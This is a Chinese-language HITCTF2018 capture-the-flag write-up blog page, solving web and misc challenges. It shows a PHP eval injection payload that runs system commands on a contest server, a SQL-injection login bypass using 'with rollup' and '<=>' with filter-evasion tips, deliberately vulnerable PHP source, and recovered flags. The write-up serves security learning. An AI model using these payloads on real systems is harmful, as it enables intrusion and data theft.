@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>HITCTF2018 WriteUp | 有被小窝~</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="未完待续 WEBWeb50 PHPreadingindex.php.bak源码泄露： 123&amp;lt;?php eval(base64_decode(&amp;apos;JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw==">
+<meta name="keywords" content="Sec,WriteUp,MISC,Web,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCTF2018 WriteUp">
+<meta property="og:url" content="https://lovegood.github.io/2018/02/02/HITCTF2018-WriteUp/index.html">
+<meta property="og:site_name" content="有被小窝~">
+<meta property="og:description" content="未完待续 WEBWeb50 PHPreadingindex.php.bak源码泄露： 123&amp;lt;?php eval(base64_decode(&amp;apos;JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw==">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-02-03T13:19:03.964Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCTF2018 WriteUp">
+<meta name="twitter:description" content="未完待续 WEBWeb50 PHPreadingindex.php.bak源码泄露： 123&amp;lt;?php eval(base64_decode(&amp;apos;JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw==">
+  
+    <link rel="alternative" href="/atom.xml" title="有被小窝~" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="https://ooo.0o0.ooo/2017/11/12/5a081d9c5a4ce.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+
+  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+  
+</head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://i.loli.net/2017/11/06/5a0001e145f32.png" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Cytosine</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">智能是人类未来之光，安全是人类基本需求。</p>
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>guest@lovegood.github.io $ </li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+						<li>whoami</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">cd ~</a></li>
+				        
+							<li><a href="/archives">ls -al post</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/AboutMe/" style="font-size: 15px;">AboutMe</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/MISC/" style="font-size: 10px;">MISC</a> <a href="/tags/Sec/" style="font-size: 20px;">Sec</a> <a href="/tags/Steg/" style="font-size: 10px;">Steg</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/WriteUp/" style="font-size: 15px;">WriteUp</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://eternalsakura13.com/">Sakura</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.uaf.li/">Murasaki</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://nolongerwait.com/">秦天</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://wh1te.me/">wh1te</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">Artificial Intelligence · Grade Two</div>
+					<div id="js-aboutme">CyberSecurity · Beginner</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Cytosine</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://i.loli.net/2017/11/06/5a0001e145f32.png" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Cytosine</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">智能是人类未来之光，安全是人类基本需求。</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">cd ~</a></li>
+		        
+					<li><a href="/archives">ls -al post</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-HITCTF2018-WriteUp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/02/02/HITCTF2018-WriteUp/" class="article-date">
+  	<time datetime="2018-02-02T14:10:45.000Z" itemprop="datePublished">2018-02-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HITCTF2018 WriteUp
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MISC/">MISC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sec/">Sec</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WriteUp/">WriteUp</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>未完待续</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web50-PHPreading"><a href="#Web50-PHPreading" class="headerlink" title="Web50 PHPreading"></a>Web50 PHPreading</h2><p><code>index.php.bak</code>源码泄露：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">eval(base64_decode(&apos;JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw==&apos;))</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cyto$ base64 JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw==</div><div class="line">b&quot;$flag=$_GET[&apos;asdfgjxzkallgj8852&apos;];if($flag==&apos;H1TctF2018EzCTF&apos;)&#123;die($flag);&#125;die(&apos;emmmm&apos;);&quot;</div></pre></td></tr></table></figure>
+<p>So</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?asdfgjxzkallgj8852=H1TctF2018EzCTF</div></pre></td></tr></table></figure>
+<p>HITCTF{Php_Is_ez_to_Read}</p>
+<h2 id="Web150-BabyEval"><a href="#Web150-BabyEval" class="headerlink" title="Web150 BabyEval"></a>Web150 BabyEval</h2><p>感谢@pcat师傅</p>
+<p>审查元素：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">$str=@(string)$_GET[&apos;str&apos;];</div><div class="line">blackListFilter($black_list, $str);</div><div class="line">eval(&apos;$str=&quot;&apos;.addslashes($str).&apos;&quot;;&apos;);</div><div class="line">--&gt;</div></pre></td></tr></table></figure>
+<p><a href="http://skysec.top/2018/02/01/HITCTF-WEB%E9%A2%98%E8%A7%A3/#BabyEval" target="_blank" rel="external">点此查看一叶飘零师傅的wp，写得很详细</a></p>
+<p>窝这里再记个笔记：</p>
+<ul>
+<li>直接<code>phpinfo()</code>会由于addslashes出现转义，命令无法执行</li>
+<li>加上大括号<code>${phpinfo()}</code>，被当做一个变量，变量名为大括号里面的内容<code>phpinfo()</code>，再来一个大括号<code>{}</code>，所以会被解析成<code>&quot;phpinfo()&quot;</code></li>
+<li><code>{}</code>有时可以当<code>[]</code>用，例如<code>str{42}==$str[42]</code>。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://120.24.215.80:10013/?str=$&#123;system($_POST[1])&#125;</div><div class="line">然后POST  1=ls /</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">162920976d9c04ac69e2f4392a8cffbf_flag.txt</div><div class="line">bin</div><div class="line">boot</div><div class="line">dev</div><div class="line">etc</div><div class="line">home</div><div class="line">lib</div><div class="line">lib64</div><div class="line">media</div><div class="line">mnt</div><div class="line">opt</div><div class="line">proc</div><div class="line">root</div><div class="line">run</div><div class="line">run.sh</div><div class="line">sbin</div><div class="line">srv</div><div class="line">sys</div><div class="line">tmp</div><div class="line">usr</div><div class="line">var</div></pre></td></tr></table></figure>
+<p>So:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1=cat /162920976d9c04ac69e2f4392a8cffbf_flag.txt</div></pre></td></tr></table></figure>
+<p>flag{162920976d9c04ac69e2f4392a8cffbf}</p>
+<h2 id="Web150-BabyLeakage"><a href="#Web150-BabyLeakage" class="headerlink" title="Web150 BabyLeakage"></a>Web150 BabyLeakage</h2><p>比赛时没做出来，照着<a href="http://skysec.top/2018/02/01/HITCTF-WEB%E9%A2%98%E8%A7%A3/#BabyLeakage" target="_blank" rel="external">飘零师傅的wp</a>复现一下</p>
+<blockquote>
+<p>随便点一点，发现是Django写的</p>
+</blockquote>
+<p>窝赶紧去搜了一下Django是什么？</p>
+<blockquote>
+<p>Django is a high-level Python Web framework that encourages rapid development and clean, pragmatic design.<br><a href="https://www.djangoproject.com/" target="_blank" rel="external">Django官网</a></p>
+</blockquote>
+<h2 id="Web200-BabyInjection"><a href="#Web200-BabyInjection" class="headerlink" title="Web200 BabyInjection"></a>Web200 BabyInjection</h2><p>感谢@一叶飘零师傅 @pcat师傅</p>
+<p><a href="http://www.au1ge.xyz/2017/05/14/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E5%81%8F%E9%97%A8%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">这里有一篇关于with rollup的文章</a>，和这题神似。</p>
+<p>题目源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line">if (!isset($_POST[&apos;username&apos;]) || !isset($_POST[&apos;passwd&apos;])) &#123;</div><div class="line">    echo &apos;Login and get the flag&apos;;</div><div class="line">	echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;</div><div class="line">	echo &apos;&lt;input name=&quot;username&quot; type=&quot;text&quot; placeholder=&quot;username&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</div><div class="line">	echo &apos;&lt;input name=&quot;passwd&quot; type=&quot;text&quot; placeholder=&quot;passwd&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</div><div class="line">	echo &apos;&lt;input type=&quot;submit&quot; &gt;&lt;/input&gt;&apos;.&quot;&lt;br/&gt;&quot;;</div><div class="line">	echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;</div><div class="line">    die;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$flag = &apos;&apos;;</div><div class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or&quot;;</div><div class="line"></div><div class="line">$username = $_POST[&apos;username&apos;];</div><div class="line">$passwd = $_POST[&apos;passwd&apos;];</div><div class="line">if (preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$username)==1)&#123;</div><div class="line">    die(&quot;Hacker hacker hacker~&quot;);</div><div class="line">&#125;</div><div class="line">if (preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$passwd)==1)&#123;</div><div class="line">    die(&quot;Hacker hacker hacker~&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$conn = mysqli_connect();</div><div class="line"></div><div class="line">$query = &quot;SELECT * FROM users WHERE username=&apos;&#123;$username&#125;&apos;;&quot;;</div><div class="line">echo $query.&quot;&lt;br&gt;&quot;;</div><div class="line">$query = mysqli_query($conn, $query);</div><div class="line">if (mysqli_num_rows($query) == 1)&#123;</div><div class="line">    $result = mysqli_fetch_array($query);</div><div class="line">    if ($result[&apos;passwd&apos;] == $passwd)&#123;</div><div class="line">        die(&apos;you did it and this is your flag: &apos;.$flag);</div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line">        die(&apos;Wrong password&apos;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">    die(&apos;Wrong username&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>payload:(POST)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos; || 1 group by passwd with rollup having passwd &lt;=&gt; null#&amp;passwd=</div></pre></td></tr></table></figure>
+<ul>
+<li>with rollup : mysql中把group by的结果进行汇总 <a href="http://blog.csdn.net/jiangnan2014/article/details/17229713" target="_blank" rel="external">具体用法可参看这里</a></li>
+<li><code>select * from table_name group by a with rollup</code>会让查询结果增加一个a为NULL的行</li>
+<li><code>select * from users where username=&#39;admin&#39; group by passwd with rollup</code>就回产生一个passwd为NULL的行，再用<code>limit</code>它取出来，然后传入一个空的passwd就可以NULL==NULL，绕过验证了。</li>
+<li>如果不知道username，则可以使用<code>username=&quot; or 1=1</code>，本题里虽然<code>or</code>被过滤，但还可以使用<code>||</code>。而文章中还给了另一种方式，<code>username=&quot;=0</code>。所以给出第二种payload<code>username=&#39;=0 group by passwd with rollup having passwd &lt;=&gt; null#&amp;passwd=</code>。</li>
+<li>若逗号被过滤不能<code>limit n,1</code>，则可用<code>limit 1 offset 1</code>绕过。</li>
+<li>而本题，<code>limit</code>被过滤，<code>group by</code>的下一条可用语句是<code>having</code>，则构造having语句来找到passwd=NULL的那一行。</li>
+<li>having语句生效是因为where语句为true，若直接<code>passwd=NULL</code>，会由于mysql<code>null=null</code>返回null而null。故改用<code>&lt;=&gt;</code>，mysql中<code>null&lt;=&gt;null</code>时，返回1，所以有<code>group by passwd with rollup having passwd &lt;=&gt; null</code></li>
+</ul>
+<h2 id="Web200-小电影"><a href="#Web200-小电影" class="headerlink" title="Web200 小电影"></a>Web200 小电影</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!-- flag is in /flag.txt --&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>首先可以判断既然是flag.txt，那么肯定不会在www目录下，否则可以直接读到了<br>所以这个flag文件应该存在于根目录<br>（大佬的分析）</p>
+</blockquote>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="MISC50签到题"><a href="#MISC50签到题" class="headerlink" title="MISC50签到题"></a>MISC50签到题</h2><p>感谢@ju5tw4nty0u</p>
+<p>youtube搜HITCTF2018就有视频了，视频中就有flag</p>
+<p>HITCTF{Across the Great Wall we can reach every corner in the world}</p>
+<h2 id="MISC150-BaSO4"><a href="#MISC150-BaSO4" class="headerlink" title="MISC150 BaSO4"></a>MISC150 BaSO4</h2><p>uncompyle2 -o ba.py base…..pyc</p>
+<p>Py3:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    b_file = &apos;flag_encode.txt&apos;</div><div class="line">    log_file = &apos;log.txt&apos;</div><div class="line"></div><div class="line">    b = open(b_file, &apos;rt&apos;).read()</div><div class="line"></div><div class="line">    for i in range(0, 20):</div><div class="line">        try:</div><div class="line">            b = base64.b32decode(b)</div><div class="line">        except:</div><div class="line">            b = base64.b64decode(b)</div><div class="line"></div><div class="line">        with open(log_file, &apos;at&apos;) as f:</div><div class="line">            f.write(b)</div></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/12/19/番剧推荐/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">番剧推荐（常年更新）</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2018 Cytosine
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: true
+	}
+</script>
+<script src="/js/main.js"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
